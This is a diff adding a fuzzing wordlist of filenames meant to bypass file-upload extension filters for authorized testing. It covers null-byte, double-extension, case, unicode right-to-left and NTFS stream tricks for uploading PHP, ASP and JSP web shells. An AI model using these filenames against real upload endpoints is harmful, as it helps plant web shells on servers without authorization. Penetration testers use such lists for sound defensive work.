@@ -1,0 +1,121 @@
+﻿# File upload — extension bypass (PAT Upload Insecure Files + PortSwigger labs)
+# Use as filename values in multipart upload. Authorized testing only.
+
+# === PHP ===
+shell.php
+shell.php3
+shell.php4
+shell.php5
+shell.php7
+shell.phtml
+shell.pht
+shell.phps
+shell.phar
+shell.phpt
+shell.pgif
+shell.inc
+shell.php.jpg
+shell.jpg.php
+shell.png.php5
+shell.php.png
+shell.php%00.jpg
+shell.php\x00.jpg
+shell.php%00.png
+shell.php%00.gif
+shell.pHp
+shell.pHP5
+shell.PhAr
+shell.php...... 
+shell.php%20
+shell.php%0d%0a.jpg
+shell.php%0a
+shell.php/
+shell.php\
+shell.j\sp
+shell.j/sp
+shell.jsp/././././.
+shell.php;.jpg
+shell.php:.jpg
+shell.php::$data
+shell.php::$data.
+shell.asax:.jpg
+shell.aspx:shell.jpg
+name.%E2%80%AEphp.jpg
+
+# === ASP / ASPX / IIS ===
+shell.asp
+shell.aspx
+shell.config
+shell.cer
+shell.asa
+shell.aspx;1.jpg
+shell.soap
+shell.aspx%00.jpg
+shell.asp;.jpg
+
+# === JSP / Java ===
+shell.jsp
+shell.jspx
+shell.jsw
+shell.jsv
+shell.jspf
+shell.wss
+shell.do
+shell.actions
+
+# === Perl / Coldfusion / Node ===
+shell.pl
+shell.pm
+shell.cgi
+shell.cfm
+shell.cfml
+shell.cfc
+shell.js
+shell.json
+shell.node
+
+# === Dangerous non-script extensions ===
+shell.svg
+shell.gif
+shell.csv
+shell.xml
+shell.avi
+shell.html
+shell.htm
+shell.zip
+shell.shtml
+shell.stm
+shell.htaccess
+shell.web.config
+shell.uwsgi.ini
+shell.__init__.py
+shell.pth
+
+# === Double / reverse double ===
+image.jpg.php
+image.png.php5
+image.gif.asp
+document.pdf.php
+avatar.jpeg.aspx
+photo.png.phtml
+test.txt.php
+backup.tar.php
+archive.zip.php
+
+# === Case / unicode tricks ===
+sHeLl.PhP
+SHELL.PHP
+shell.pHp5
+shell.%70%68%70
+shell.%50%48%50
+
+# === Trailing chars (Windows strips dots) ===
+shell.php.....
+shell.aspx.....
+shell.php 
+shell.aspx 
+
+# === Short names / ADS (Windows NTFS) ===
+shell.aspx:evil.jpg
+shell.asp::$data
+webshell.aspx:.jpg
